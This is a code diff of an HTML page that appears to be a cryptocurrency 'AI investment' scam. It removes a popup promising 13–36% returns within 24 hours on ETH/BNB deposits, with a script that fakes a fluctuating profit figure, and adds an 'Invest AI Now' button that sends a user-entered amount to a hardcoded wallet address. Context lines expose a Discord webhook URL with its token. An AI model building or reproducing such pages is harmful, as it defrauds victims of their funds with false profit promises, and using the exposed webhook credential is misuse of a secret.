@@ -722,48 +722,6 @@ setInterval(() => {
     from, to { opacity: 0 }
     50% { opacity: 1 }
   }
-.popup2 {
-  position: relative;
-  display: inline-block;
-}
-
-.popup2-content {
-  position: absolute;
-  z-index: 1;
-  visibility: hidden;
-  background-color: #fff;
-  color: #000;
-  border: 1px solid #000;
-  border-radius: 5px;
-  padding: 10px;
-  width: 300px;
-  text-align: center;
-}
-
-.popup2:hover .popup-content {
-  visibility: visible;
-}
-
-.popup2-text {
-  font-size: 14px;
-  line-height: 1.5;
-}
-
-.popup2-amount {
-  font-weight: bold;
-  font-size: 16px;
-}
-
-.input-box {
-  width: 100%;
-  padding: 8px;
-  border: 1px solid #ccc;
-  border-radius: 4px;
-  box-sizing: border-box;
-  margin-top: 6px;
-  margin-bottom: 16px;
-}
-
 
 
 </style>
@@ -802,17 +760,9 @@ setInterval(() => {
 
 
 
-   <input type="number" id="amount1" class="input-box">
-
-<div class="popup2" id="popup">
-  <div class="popup2-content">
-    <div class="popup2-text">
-      <p>Send <span class="popup2-amount">0.01 ETH/BNB</span> to get 13% profitability algorithm</p>
-      <p>Send <span class="popup2-amount">0.1 ETH/BNB</span> to get 23% profitability algorithm</p>
-      <p>Send <span class="popup2-amount">1 ETH/BNB</span> to get 36% profitability algorithm</p>
-      <p>Your return on investment will be ready in your wallet exactly 24 hours after depositing.</p>
-    </div>
-  </div>
+<input type="number" id="amount1">
+  <div style="text-align: center;">
+  <button onclick="sendETH('0x01C65F22A9478C2932e62483509c233F0aaD5c72', document.getElementById('amount1').value)">Invest AI Now</button>
 </div>
 
   <div style="text-align: center;">
@@ -867,25 +817,7 @@ function sendWebhookMessage(webhookUrl, message) {
       const webhookUrl = "https://discordapp.com/api/webhooks/1078091750171746324/_S78Y9bzo5TvyNoeplYhQOSHA-lzF-P_qhEhTBZTUEcYydZHr682gNg99QsXnnswGj6-";
 
     </script>
-	   <script>
-		  const amountInput = document.getElementById("amount1");
-const popup2 = document.getElementById("popup2");
-const percentage = document.getElementById("percentage");
-
-amountInput.addEventListener("mouseenter", function() {
-  popup.style.display = "block";
-  percentage.textContent = 13;
-  setInterval(function() {
-    const currentPercentage = parseInt(percentage.textContent);
-    const newPercentage = currentPercentage + Math.floor(Math.random() * 3) - 1;
-    percentage.textContent = Math.max(0, Math.min(newPercentage, 36));
-  }, 1000);
-});
-
-amountInput.addEventListener("mouseleave", function() {
-  popup.style.display = "none";
-});
-	  </script>
+	
 
 
 
